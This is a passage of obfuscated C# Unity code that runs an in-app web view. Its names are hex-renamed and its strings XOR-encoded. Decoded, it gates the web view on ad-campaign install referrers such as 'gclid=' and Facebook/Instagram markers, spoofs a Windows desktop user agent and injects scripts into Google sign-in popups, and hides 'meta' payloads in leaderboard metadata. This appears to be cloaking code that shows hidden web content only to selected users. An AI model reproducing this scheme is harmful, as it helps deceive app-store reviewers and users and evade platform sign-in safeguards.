        _0x88275154.OnPageProgressChanged += (_0xd83cf24a, _0x26738701) =>
        {
            if (_0xa72c34cb)
                return;
            if (!firstLoadShown && _0x26738701 >= 0.65f)
            {
                firstLoadShown = true;
                _0x440f35f6 = false;
                _0x0caec46a(false);
                _0x24289db0();
                _0x18b3b0ae();
                _0xd83cf24a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x41535038(_0x530a90e8._0xfeee60cc(new byte[9] { 72, 73, 96, 80, 79, 90, 81, 90, 91 }, 63));
                WLog(_0x530a90e8._0xfeee60cc(new byte[32] { 247, 219, 211, 212, 154, 237, 223, 216, 236, 211, 223, 205, 154, 201, 210, 213, 205, 212, 154, 216, 195, 154, 202, 200, 213, 221, 200, 223, 201, 201, 128, 154 }, 186) + _0x26738701);
            }
        };
        _0x88275154.OnPageFinished += (_0xd83cf24a, _0x57798ffc, _0xcd89e59d) =>
        {
            if (_0xa72c34cb && IsAboutBlank(_0xcd89e59d))
            {
                _0xa72c34cb = false;
                WLog(_0x530a90e8._0xfeee60cc(new byte[28] { 29, 63, 40, 58, 44, 63, 32, 109, 44, 47, 34, 56, 57, 119, 47, 33, 44, 35, 38, 109, 43, 36, 35, 36, 62, 37, 40, 41 }, 77));
                return;
            }

            WLog(_0x530a90e8._0xfeee60cc(new byte[24] { 114, 94, 86, 81, 31, 104, 90, 93, 105, 86, 90, 72, 31, 121, 86, 81, 86, 76, 87, 90, 91, 5, 31, 20 }, 63) + (Time.realtimeSinceStartup - _0x51444364).ToString(_0x530a90e8._0xfeee60cc(new byte[5] { 2, 28, 2, 2, 2 }, 50)) + _0x530a90e8._0xfeee60cc(new byte[7] { 136, 219, 152, 148, 159, 158, 198 }, 251) + _0x57798ffc + _0x530a90e8._0xfeee60cc(new byte[5] { 112, 37, 34, 60, 109 }, 80) + _0xcd89e59d);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x440f35f6 = false;
                _0x0caec46a(false);
                _0x24289db0();
                _0x18b3b0ae();
                _0xd83cf24a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x41535038(_0x530a90e8._0xfeee60cc(new byte[9] { 64, 65, 104, 88, 71, 82, 89, 82, 83 }, 55));
                WLog(_0x530a90e8._0xfeee60cc(new byte[33] { 147, 191, 183, 176, 254, 137, 187, 188, 136, 183, 187, 169, 254, 184, 183, 172, 173, 170, 254, 178, 177, 191, 186, 254, 189, 177, 179, 174, 178, 187, 170, 187, 186 }, 222));
            }
            else if (_0x440f35f6)
            {
                _0x440f35f6 = false;
                _0x0caec46a(false);
                _0xd83cf24a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x530a90e8._0xfeee60cc(new byte[40] { 118, 90, 82, 85, 27, 108, 94, 89, 109, 82, 94, 76, 27, 104, 83, 84, 76, 27, 90, 93, 79, 94, 73, 27, 87, 84, 90, 95, 82, 85, 92, 27, 93, 82, 85, 82, 72, 83, 94, 95 }, 59));
            }
            else
            {
                _0x0caec46a(false);
            }

            if (_0x2ac5d5d2 && !IsGoogleAuthFlowUrl(_0xcd89e59d) && !IsGoogleAuthFlowUrl(_0xcd89e59d))
            {
                WLog(_0x530a90e8._0xfeee60cc(new byte[48] { 241, 217, 217, 209, 218, 211, 150, 215, 195, 194, 222, 150, 197, 211, 211, 219, 197, 150, 208, 223, 216, 223, 197, 222, 211, 210, 150, 155, 136, 150, 196, 211, 197, 194, 217, 196, 211, 150, 210, 211, 208, 215, 195, 218, 194, 150, 227, 247 }, 182));
                _0x2ac5d5d2 = false;
                _0x0d771b38.SetUserAgent("");
            }
        };
        _0x88275154.OnShouldClose += _0xd83cf24a =>
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[41] { 221, 210, 227, 245, 242, 219, 166, 203, 231, 239, 232, 166, 209, 227, 228, 208, 239, 227, 241, 166, 201, 232, 213, 238, 233, 243, 234, 226, 197, 234, 233, 245, 227, 166, 239, 232, 240, 233, 237, 227, 226 }, 134));
            _0x501a5d08();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x88275154.SetPopupPageEventEnabled(true);
        bool _0xf3a46fe7 = false;
        bool _0x1e7749a1 = false;
        _0x88275154.OnMultipleWindowOpened += (_0xd83cf24a, _0xc4630085) =>
        {
            _0xd83cf24a.ScrollTo(0, 0, false);
            WLog(_0x530a90e8._0xfeee60cc(new byte[43] { 209, 222, 239, 249, 254, 215, 170, 199, 235, 227, 228, 170, 221, 239, 232, 220, 227, 239, 253, 170, 199, 255, 230, 254, 227, 250, 230, 239, 221, 227, 228, 238, 229, 253, 170, 197, 250, 239, 228, 239, 238, 176, 170 }, 138) + _0xc4630085);
            var _0x1a7d2fed = _0x88275154.GetPopupWindow(_0xc4630085);
            if (_0x1a7d2fed == null)
                return;
            _0x98e8c3c0.Add(_0x1a7d2fed);
            Debug.Log($"[Test] Popup ID: {_0x1a7d2fed.Id}");
            _0x1a7d2fed.OnPageStarted += (_0x725eda17, _0xcd89e59d) =>
            {
                WLog(_0x530a90e8._0xfeee60cc(new byte[36] { 170, 165, 148, 130, 133, 172, 209, 161, 158, 129, 132, 129, 209, 166, 148, 147, 167, 152, 148, 134, 209, 190, 159, 161, 144, 150, 148, 162, 133, 144, 131, 133, 148, 149, 203, 209 }, 241) + _0xcd89e59d);
                _0x3a61bd38 = 0;
                if (string.IsNullOrEmpty(_0xcd89e59d) || IsAboutBlank(_0xcd89e59d))
                    return;
                if (IsGoogleAuthFlowUrl(_0xcd89e59d))
                {
                    WLog(_0x530a90e8._0xfeee60cc(new byte[57] { 123, 116, 69, 83, 84, 125, 0, 112, 79, 80, 85, 80, 0, 103, 79, 79, 71, 76, 69, 0, 65, 85, 84, 72, 0, 70, 76, 79, 87, 0, 13, 30, 0, 83, 80, 79, 79, 70, 0, 103, 79, 79, 71, 76, 69, 0, 99, 72, 82, 79, 77, 69, 0, 117, 97, 26, 0 }, 32) + _0xcd89e59d);
                    _0xf3a46fe7 = false;
                    _0xb02eeeb7();
                    if (_0x725eda17 != null && _0x725eda17.IsAlive)
                        _0x725eda17.EvaluateJavaScript(_0xe83dba7e());
                    return;
                }

                if (_0x0d771b38 == null)
                    return;
                if (!_0xf3a46fe7)
                {
                    _0xf3a46fe7 = true;
                    _0x0d771b38.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x530a90e8._0xfeee60cc(new byte[39] { 112, 127, 78, 88, 95, 118, 11, 123, 68, 91, 94, 91, 11, 74, 91, 91, 71, 82, 11, 124, 66, 69, 79, 68, 92, 88, 11, 79, 78, 88, 64, 95, 68, 91, 11, 126, 106, 17, 11 }, 43) + _0xcd89e59d);
                }

                if (_0x725eda17 != null && _0x725eda17.IsAlive)
                    _0x725eda17.EvaluateJavaScript(_0xd11c8114());
                if (!_0x1e7749a1 && _0x725eda17 != null && _0x725eda17.IsAlive && IsHttpUrl(_0xcd89e59d))
                {
                    _0x1e7749a1 = true;
                }
            };
            _0x1a7d2fed.OnPageFinished += (_0x725eda17, _0x00f0af8c) =>
            {
                string _0xaa2a8b32 = _0x00f0af8c != null ? _0x00f0af8c.data : string.Empty;
                WLog(_0x530a90e8._0xfeee60cc(new byte[35] { 208, 223, 238, 248, 255, 214, 171, 219, 228, 251, 254, 251, 171, 220, 238, 233, 221, 226, 238, 252, 171, 205, 226, 229, 226, 248, 227, 238, 239, 177, 171, 254, 249, 231, 182 }, 139) + _0xaa2a8b32);
                if (_0x725eda17 == null || !_0x725eda17.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0xaa2a8b32))
                {
                    _0xb02eeeb7();
                    _0x725eda17.EvaluateJavaScript(_0xe83dba7e());
                    return;
                }

                if (!_0xf3a46fe7)
                    return;
                _0x725eda17.EvaluateJavaScript(_0xd11c8114());
            };
        };
        _0x88275154.OnMultipleWindowClosed += (_0xd83cf24a, _0xc4630085) =>
        {
            _0x98e8c3c0.RemoveAll(_0xe4745d98 => _0xe4745d98 == null || _0xe4745d98.Id == _0xc4630085 || !_0xe4745d98.IsAlive);
            _0x0caec46a(false);
            if (_0x98e8c3c0.Count == 0 && _0x0d771b38 != null)
            {
                _0xf3a46fe7 = false;
                _0x1e7749a1 = false;
                _0x5155a0a3();
            }

            WLog(_0x530a90e8._0xfeee60cc(new byte[43] { 246, 249, 200, 222, 217, 240, 141, 224, 204, 196, 195, 141, 250, 200, 207, 251, 196, 200, 218, 141, 224, 216, 193, 217, 196, 221, 193, 200, 250, 196, 195, 201, 194, 218, 141, 238, 193, 194, 222, 200, 201, 151, 141 }, 173) + _0xc4630085);
        };
        _0x88275154.RegisterOnRequestMediaCapturePermission(_0x7451ab5d =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    internal void _0x18b3b0ae()
    {
        Rect _0x6cb1c0b3 = Screen.safeArea;
        Vector2 _0xf0032dac = new Vector2(Screen.width, Screen.height);
        if (_0x6cb1c0b3 == lastSafe && _0xf0032dac == lastSize)
            return;
        // Apply manual padding
        _0x6cb1c0b3.xMin += _0xa99dd764;
        _0x6cb1c0b3.xMax -= _0x98dcc0ce;
        _0x6cb1c0b3.yMin += _0x45d39847;
        _0x6cb1c0b3.yMax -= _0x66d67b85;
        // Convert Unity safe area -> native WebView frame
        Rect _0x60f0a30e = new Rect(_0x6cb1c0b3.x, _0xf0032dac.y - _0x6cb1c0b3.y - _0x6cb1c0b3.height, // Y flip for native coordinate system
 _0x6cb1c0b3.width, _0x6cb1c0b3.height);
        _0x0d771b38.Frame = _0x60f0a30e;
        lastSafe = Screen.safeArea;
        lastSize = _0xf0032dac;
    }

    private string _0x3752dd53 = "";
    async Task _0x4385d8e3(string _0xa38d409e, double _0xbb4f519e, string _0xf8bac05c)
    {
        var _0xcdaf78de = new _0x83b84ed4
        {
            payload = _0xf8bac05c ?? ""
        };
        if (_0xbb4f519e != 1d)
        {
            try
            {
                var _0xb1d85326 = await LeaderboardsService.Instance.GetPlayerScoreAsync(_0xa38d409e, new GetPlayerScoreOptions { IncludeMetadata = true });
                var _0x713f8b9e = ReadScoreMetadata(_0xb1d85326 != null ? _0xb1d85326.Metadata : null);
                if (!string.IsNullOrEmpty(_0x713f8b9e.isMeta) || !string.IsNullOrEmpty(_0x713f8b9e.meta))
                {
                    _0xcdaf78de.isMeta = _0x713f8b9e.isMeta;
                    _0xcdaf78de.meta = _0x713f8b9e.meta;
                }
            }
            catch (Exception)
            {
            }
        }

        await LeaderboardsService.Instance.AddPlayerScoreAsync(_0xa38d409e, _0xbb4f519e, new AddPlayerScoreOptions { Metadata = _0xcdaf78de });
    }

    internal bool IsAboutBlank(string _0xf37fc1ce)
    {
        if (string.IsNullOrEmpty(_0xf37fc1ce))
            return false;
        return _0xf37fc1ce.StartsWith(_0x530a90e8._0xfeee60cc(new byte[11] { 22, 21, 24, 2, 3, 77, 21, 27, 22, 25, 28 }, 119), StringComparison.OrdinalIgnoreCase);
    }

    static readonly string LeaderboardId = _0x530a90e8._0xfeee60cc(new byte[1] { 122 }, 74);
    private string _0x277f9db2 { get; set; }

    private void _0x5155a0a3()
    {
        if (_0x0d771b38 == null)
            return;
        if (_0x2ac5d5d2)
            _0x0d771b38.SetUserAgent(_0xb641090d());
        else
            _0x0d771b38.SetUserAgent("");
    }

    private void _0xb6ecfb22()
    {
        using (var _0x2f626b91 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[30] { 186, 182, 180, 247, 172, 183, 176, 173, 160, 234, 189, 247, 169, 181, 184, 160, 188, 171, 247, 140, 183, 176, 173, 160, 137, 181, 184, 160, 188, 171 }, 217)))
        using (var _0x694544b5 = _0x2f626b91.GetStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 95, 73, 78, 78, 89, 82, 72, 125, 95, 72, 85, 74, 85, 72, 69 }, 60)))
        using (var _0xe8ef4e47 = _0x694544b5.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[9] { 139, 137, 152, 165, 130, 152, 137, 130, 152 }, 236)))
        {
            if (_0xe8ef4e47 == null)
                return;
            using (var _0x9fcde88d = _0xe8ef4e47.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[9] { 67, 65, 80, 97, 92, 80, 86, 69, 87 }, 36)))
            {
                if (_0x9fcde88d == null)
                    return;
                using (var _0xdf2a0803 = new AndroidJavaObject(_0x530a90e8._0xfeee60cc(new byte[19] { 116, 105, 124, 53, 113, 104, 116, 117, 53, 81, 72, 84, 85, 84, 121, 113, 126, 120, 111 }, 27)))
                using (var _0xfcda4e10 = _0x9fcde88d.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[6] { 140, 130, 158, 180, 130, 147 }, 231)))
                using (var _0x52917e8f = _0xfcda4e10.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[8] { 36, 57, 40, 63, 44, 57, 34, 63 }, 77)))
                {
                    while (_0x52917e8f.Call<bool>(_0x530a90e8._0xfeee60cc(new byte[7] { 14, 7, 21, 40, 3, 30, 18 }, 102)))
                    {
                        string _0x582084d7 = _0x52917e8f.Call<string>(_0x530a90e8._0xfeee60cc(new byte[4] { 36, 47, 50, 62 }, 74));
                        using (var _0xb00fbadd = _0x9fcde88d.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[3] { 234, 232, 249 }, 141), _0x582084d7))
                        {
                            _0xdf2a0803.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[3] { 131, 134, 135 }, 243), _0x582084d7, _0xb00fbadd);
                        }
                    }

                    string _0x14a283e5 = _0xdf2a0803.Call<string>(_0x530a90e8._0xfeee60cc(new byte[8] { 137, 146, 174, 137, 143, 148, 147, 154 }, 253));
                    if (!string.IsNullOrEmpty(_0x14a283e5))
                    {
                        _0x3e484c80(_0x14a283e5);
                        _0xe7591052(_0x14a283e5);
                    }
                }
            }
        }
    }

    private bool _0xf8cd3e31 = false;
    private int _0x66d67b85 = 5, _0x45d39847 = 5, _0xa99dd764 = 5, _0x98dcc0ce = 5;
    private async Task _0x4d3aaf9b()
    {
        if (await _0x973acce7())
            return;
        if (await _0x22919be2())
            return;
        if (await _0x6e73113d())
            return;
        _0x8534911b();
        await _0xa4a725e6(_0x423e0855());
        _0x59d6cb5b = await _0x05b621d1();
        await _0xef54b18e();
    }

    private IEnumerator _0x423e0855()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[26] { 253, 242, 195, 213, 210, 251, 134, 239, 200, 207, 210, 207, 199, 202, 207, 220, 195, 244, 195, 192, 192, 195, 212, 195, 212, 134 }, 166));
            }
#endif
        }

        bool _0x33399d87 = false;
        InstallReferrer.GetReferrer((_0xcc2e4581) =>
        {
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[24] { 46, 33, 16, 6, 1, 85, 39, 16, 19, 16, 7, 7, 16, 7, 40, 85, 18, 16, 1, 85, 151, 243, 231, 85 }, 117) + _0xec76fc2f);
            if (_0xcc2e4581.IsSuccess)
            {
                _0xec76fc2f = _0xcc2e4581.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[28] { 94, 81, 96, 118, 113, 37, 87, 96, 99, 96, 119, 119, 96, 119, 88, 37, 86, 112, 102, 102, 96, 118, 118, 37, 231, 131, 151, 37 }, 5) + _0xec76fc2f);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[27] { 109, 98, 83, 69, 66, 22, 100, 83, 80, 83, 68, 68, 83, 68, 107, 22, 112, 87, 95, 90, 83, 82, 22, 212, 176, 164, 22 }, 54) + _0xcc2e4581);
#endif
                }

                _0xec76fc2f = "";
            }

            _0x0f8fe245 = true;
        });
        StartCoroutine(_0x8e8ace4f(2f));
        yield return new WaitUntil(() => _0x0f8fe245);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xec76fc2f}");
#endif
        }

        bool _0x7392058a = _0xec76fc2f.Contains(_0x530a90e8._0xfeee60cc(new byte[6] { 236, 232, 231, 226, 239, 182 }, 139));
        _0x33399d87 = _0x7392058a || _0xec76fc2f.Contains(_0x530a90e8._0xfeee60cc(new byte[18] { 89, 72, 72, 75, 22, 81, 86, 75, 76, 89, 95, 74, 89, 85, 22, 91, 87, 85 }, 56)) || _0xec76fc2f.Contains(_0x530a90e8._0xfeee60cc(new byte[17] { 106, 123, 123, 120, 37, 109, 106, 104, 110, 105, 100, 100, 96, 37, 104, 100, 102 }, 11));
        _0x7b8ae979 = _0x7392058a ? "" : (_0x33399d87 ? "" : _0x7b8ae979);
        _0x7b8ae979 = _0x7b8ae979 ?? "";
        _0x277f9db2 = _0x277f9db2 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x7b8ae979}");
#endif
        }
    }

    private static string ReadPushField(Dictionary<string, object> _0xeb6c656f, string _0x42c7bf17)
    {
        if (_0xeb6c656f == null || string.IsNullOrEmpty(_0x42c7bf17))
            return string.Empty;
        if (_0xeb6c656f.TryGetValue(_0x530a90e8._0xfeee60cc(new byte[16] { 157, 156, 135, 154, 149, 154, 144, 146, 135, 154, 156, 157, 183, 146, 135, 146 }, 243), out var raw))
        {
            try
            {
                var _0xe5a73897 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0xe5a73897 != null && _0xe5a73897.TryGetValue(_0x42c7bf17, out var nestedVal))
                {
                    var _0xd9a11ad2 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0xd9a11ad2))
                        return _0xd9a11ad2;
                }
            }
            catch
            {
            }
        }

        if (_0xeb6c656f.TryGetValue(_0x42c7bf17, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    internal bool isApplicationFocus = false;
    private string _0x574823c1 = "";
    private void _0x5c547285()
    {
        if (_0x0d39213f)
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[18] { 80, 109, 124, 97, 53, 116, 121, 103, 112, 116, 113, 108, 53, 102, 125, 122, 98, 123 }, 21));
            return;
        }

        _0x0caec46a(false);
        WLog(_0x530a90e8._0xfeee60cc(new byte[46] { 126, 82, 90, 93, 19, 100, 86, 81, 101, 90, 86, 68, 19, 99, 70, 64, 91, 19, 125, 92, 71, 90, 85, 90, 80, 82, 71, 90, 92, 93, 19, 27, 91, 82, 65, 87, 68, 82, 65, 86, 19, 81, 82, 80, 88, 26 }, 51));
        ++_0x3a61bd38;
        _0x5107976c();
        if (_0x3a61bd38 <= 1)
            return;
        if (_0x45569bb3())
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[37] { 235, 214, 199, 218, 142, 221, 197, 199, 222, 222, 203, 202, 142, 131, 144, 142, 222, 193, 222, 219, 222, 221, 142, 221, 218, 199, 194, 194, 142, 193, 222, 203, 192, 203, 202, 148, 142 }, 174) + _0x98e8c3c0.Count);
            return;
        }

        Application.Quit();
    }

    private Canvas _0x6d1ec83c()
    {
        if (_0xa46b8cc8 != null)
            return _0xa46b8cc8;
        var _0x7875b4cc = gameObject.GetComponentInChildren<Canvas>();
        if (_0x7875b4cc == null)
        {
            var _0x57e113cb = new GameObject(_0x530a90e8._0xfeee60cc(new byte[6] { 122, 88, 87, 79, 88, 74 }, 57), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x7875b4cc = _0x57e113cb.GetComponent<Canvas>();
            _0x7875b4cc.transform.SetParent(transform, false);
            _0x7875b4cc.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0xa46b8cc8 = _0x7875b4cc;
        return _0xa46b8cc8;
    }

    private Task _0xa4a725e6(IEnumerator _0x2f2d4f79)
    {
        var _0x5abf455f = new TaskCompletionSource<bool>();
        StartCoroutine(_0xe6c1125a(_0x2f2d4f79, _0x5abf455f));
        return _0x5abf455f.Task;
    }

    private string _0xec76fc2f = "";
    private async Task<bool> _0x973acce7()
    {
        {
#if B_LOGS
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[37] { 201, 198, 247, 225, 230, 207, 178, 193, 251, 245, 252, 219, 252, 199, 252, 251, 230, 235, 193, 247, 224, 228, 251, 241, 247, 225, 211, 252, 253, 252, 235, 255, 253, 231, 225, 254, 235 }, 146));
#endif
        }

        try
        {
            var _0x7a5640b8 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x7a5640b8);
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[32] { 189, 178, 131, 149, 146, 187, 198, 179, 136, 143, 146, 159, 181, 131, 148, 144, 143, 133, 131, 149, 198, 175, 136, 143, 146, 143, 135, 138, 143, 156, 131, 130 }, 230));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[20] { 21, 4, 18, 21, 97, 20, 47, 40, 53, 56, 18, 36, 51, 55, 40, 34, 36, 50, 123, 97 }, 65) + ex.Message);
#endif
            }

            _0xcf88cf27?._0x1ef20944();
            return true;
        }

        bool _0xd5e00130 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0xd5e00130 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x530a90e8._0xfeee60cc(new byte[37] { 227, 236, 221, 203, 204, 229, 152, 235, 209, 223, 214, 149, 209, 214, 152, 249, 214, 215, 214, 193, 213, 215, 205, 203, 150, 152, 232, 212, 217, 193, 221, 202, 152, 241, 252, 130, 152 }, 184) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0xb3551ae3 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[25] { 21, 4, 18, 21, 97, 18, 40, 38, 47, 108, 40, 47, 97, 0, 52, 53, 41, 97, 4, 19, 19, 14, 19, 123, 97 }, 65) + ex.Message);
#endif
                }

                _0xcf88cf27?._0x1ef20944();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[28] { 1, 16, 6, 1, 117, 6, 60, 50, 59, 120, 60, 59, 117, 7, 48, 36, 32, 48, 38, 33, 117, 16, 7, 7, 26, 7, 111, 117 }, 85) + ex.Message);
#endif
                }

                _0xcf88cf27?._0x1ef20944();
                return true;
            }
        }
        while (!_0xd5e00130);
        return false;
    }

    private bool _0xa72c34cb = false;
    private string _0x7b8ae979 { get; set; }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0x0d771b38 = null;
    private readonly string[] _0x639fca71 = new string[]
    {
        _0x530a90e8._0xfeee60cc(new byte[60] { 124, 19, 2, 60, 172, 216, 228, 233, 172, 254, 233, 233, 224, 255, 172, 237, 254, 233, 172, 228, 227, 248, 172, 254, 229, 235, 228, 248, 172, 226, 227, 251, 172, 110, 12, 31, 172, 232, 227, 226, 110, 12, 21, 248, 172, 225, 229, 255, 255, 172, 245, 227, 249, 254, 172, 255, 252, 229, 226, 173 }, 140),
        _0x530a90e8._0xfeee60cc(new byte[52] { 50, 93, 79, 66, 226, 139, 182, 226, 161, 173, 183, 174, 166, 226, 160, 167, 226, 187, 173, 183, 176, 226, 174, 183, 161, 169, 187, 226, 175, 173, 175, 167, 172, 182, 226, 32, 66, 81, 226, 181, 170, 187, 226, 177, 182, 173, 178, 226, 172, 173, 181, 253 }, 194),
        _0x530a90e8._0xfeee60cc(new byte[66] { 1, 121, 66, 12, 91, 108, 195, 161, 138, 132, 195, 148, 138, 141, 144, 195, 130, 145, 134, 195, 139, 138, 151, 151, 138, 141, 132, 195, 142, 140, 145, 134, 195, 140, 133, 151, 134, 141, 195, 151, 140, 135, 130, 154, 195, 1, 99, 112, 195, 144, 151, 130, 154, 195, 138, 141, 195, 151, 139, 134, 195, 132, 130, 142, 134, 205 }, 227),
        _0x530a90e8._0xfeee60cc(new byte[54] { 23, 120, 114, 117, 199, 179, 143, 142, 148, 199, 142, 148, 199, 151, 149, 142, 138, 130, 199, 147, 142, 138, 130, 199, 5, 103, 116, 199, 147, 143, 130, 199, 133, 130, 148, 147, 199, 151, 139, 134, 158, 130, 149, 148, 199, 151, 139, 134, 158, 199, 137, 136, 144, 201 }, 231),
        _0x530a90e8._0xfeee60cc(new byte[48] { 13, 98, 105, 88, 221, 164, 146, 136, 143, 221, 138, 148, 147, 147, 148, 147, 154, 221, 142, 137, 143, 152, 156, 150, 221, 158, 146, 136, 145, 153, 221, 159, 152, 221, 146, 147, 152, 221, 142, 141, 148, 147, 221, 156, 138, 156, 132, 211 }, 253),
        _0x530a90e8._0xfeee60cc(new byte[65] { 244, 155, 158, 132, 36, 78, 101, 103, 111, 116, 107, 112, 119, 36, 101, 118, 97, 36, 105, 107, 118, 97, 36, 101, 103, 112, 109, 114, 97, 36, 112, 107, 106, 109, 99, 108, 112, 36, 230, 132, 151, 36, 119, 112, 101, 125, 36, 101, 106, 96, 36, 112, 118, 125, 36, 125, 107, 113, 118, 36, 104, 113, 103, 111, 42 }, 4),
        _0x530a90e8._0xfeee60cc(new byte[55] { 60, 83, 66, 126, 236, 137, 186, 169, 190, 181, 236, 191, 188, 165, 162, 236, 175, 163, 185, 162, 184, 191, 236, 46, 76, 95, 236, 184, 164, 169, 236, 162, 169, 180, 184, 236, 163, 162, 169, 236, 175, 163, 185, 160, 168, 236, 174, 169, 236, 181, 163, 185, 190, 191, 226 }, 204),
        _0x530a90e8._0xfeee60cc(new byte[63] { 200, 135, 186, 197, 146, 165, 10, 122, 70, 75, 83, 79, 88, 89, 10, 88, 67, 77, 66, 94, 10, 68, 69, 93, 10, 75, 88, 79, 10, 93, 67, 68, 68, 67, 68, 77, 10, 200, 170, 185, 10, 78, 69, 68, 200, 170, 179, 94, 10, 93, 75, 70, 65, 10, 75, 93, 75, 83, 10, 83, 79, 94, 4 }, 42),
        _0x530a90e8._0xfeee60cc(new byte[51] { 212, 187, 171, 162, 4, 107, 74, 72, 93, 4, 80, 76, 75, 87, 65, 4, 83, 76, 75, 4, 87, 80, 69, 93, 4, 77, 74, 4, 80, 76, 65, 4, 67, 69, 73, 65, 4, 83, 77, 74, 4, 80, 76, 65, 4, 84, 86, 77, 94, 65, 10 }, 36),
        _0x530a90e8._0xfeee60cc(new byte[64] { 171, 211, 232, 166, 241, 198, 105, 4, 38, 36, 44, 39, 61, 60, 36, 105, 32, 58, 105, 44, 63, 44, 59, 48, 61, 33, 32, 39, 46, 105, 171, 201, 218, 105, 34, 44, 44, 57, 105, 58, 57, 32, 39, 39, 32, 39, 46, 105, 47, 38, 59, 105, 48, 38, 60, 59, 105, 42, 33, 40, 39, 42, 44, 103 }, 73)
    };
    private bool _0x8d31ab8c(string _0x76cd1cca)
    {
        if (string.IsNullOrEmpty(_0x76cd1cca))
            return false;
        try
        {
            using (var _0x06918338 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[30] { 205, 193, 195, 128, 219, 192, 199, 218, 215, 157, 202, 128, 222, 194, 207, 215, 203, 220, 128, 251, 192, 199, 218, 215, 254, 194, 207, 215, 203, 220 }, 174)))
            using (var _0xc5967735 = _0x06918338.GetStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 139, 157, 154, 154, 141, 134, 156, 169, 139, 156, 129, 158, 129, 156, 145 }, 232)))
            using (var _0x44efe9e7 = _0xc5967735.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[17] { 139, 137, 152, 188, 141, 143, 135, 141, 139, 137, 161, 141, 130, 141, 139, 137, 158 }, 236)))
            using (var _0x4d4e3663 = _0x44efe9e7.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[25] { 54, 52, 37, 29, 48, 36, 63, 50, 57, 24, 63, 37, 52, 63, 37, 23, 62, 35, 1, 48, 50, 58, 48, 54, 52 }, 81), _0x76cd1cca))
            {
                if (_0x4d4e3663 == null)
                    return false;
                WLog(_0x530a90e8._0xfeee60cc(new byte[37] { 4, 47, 53, 40, 42, 34, 11, 46, 44, 34, 103, 43, 38, 50, 41, 36, 47, 103, 46, 41, 52, 51, 38, 43, 43, 34, 35, 103, 55, 38, 36, 44, 38, 32, 34, 125, 103 }, 71) + _0x76cd1cca);
                _0x4d4e3663.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[8] { 217, 220, 220, 254, 212, 217, 223, 203 }, 184), 0x10000000);
                _0xc5967735.Call(_0x530a90e8._0xfeee60cc(new byte[13] { 173, 170, 191, 172, 170, 159, 189, 170, 183, 168, 183, 170, 167 }, 222), _0x4d4e3663);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private string _0xc5348e1c(string _0xbc9dcfd3, string _0xc846b9f7)
    {
        try
        {
            var _0x798a77ba = Encoding.UTF8.GetBytes(_0xbc9dcfd3 ?? "");
            var _0x7e3fccde = PackSmallest(_0x798a77ba, out var mode);
            var _0xa65b1000 = new byte[4];
            using (var _0x0d3fa3bc = RandomNumberGenerator.Create())
                _0x0d3fa3bc.GetBytes(_0xa65b1000);
            var _0xf669f1fe = new byte[1 + _0x7e3fccde.Length];
            _0xf669f1fe[0] = mode;
            Buffer.BlockCopy(_0x7e3fccde, 0, _0xf669f1fe, 1, _0x7e3fccde.Length);
            var _0xb8085909 = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xc846b9f7 ?? ""));
            var _0x406dedf0 = AesCtr(_0xf669f1fe, _0xb8085909, _0xa65b1000);
